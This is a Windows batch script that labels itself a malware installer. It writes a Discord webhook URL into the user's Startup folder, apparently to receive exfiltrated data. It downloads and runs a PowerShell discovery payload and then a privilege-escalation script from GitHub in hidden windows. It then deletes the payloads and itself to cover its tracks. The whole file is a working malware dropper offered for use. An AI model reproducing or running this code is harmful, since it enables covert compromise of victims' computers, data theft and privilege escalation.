@rem Installer for the malware
@rem TODO: Make the CMD prompt run silently

@echo off
set "CurrentDirectory=%CD%"
set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Change directory to startup
cd /d "%StartupDirectory%"

@REM Change to your Discord Webhook URL
echo "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD" > DiscordWebhookURL.icu

@REM Download required files
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"

@REM Run the PowerShell discovery
powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"

@REM Delete the discovery file
del "Discovery.ps1"

@REM Delete the Discord Webhook file
del "DiscordWebhookURL.icu"

powershell -windowstyle hidden Invoke-WebRequest -Uri "https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd" -OutFile "PrivilegeEscalation.cmd"
powershell -windowstyle hidden -ep unrestricted "./PrivilegeEscalation.cmd"

@REM Delete the original installer
cd /d %CurrentDirectory%
del "Installer.cmd"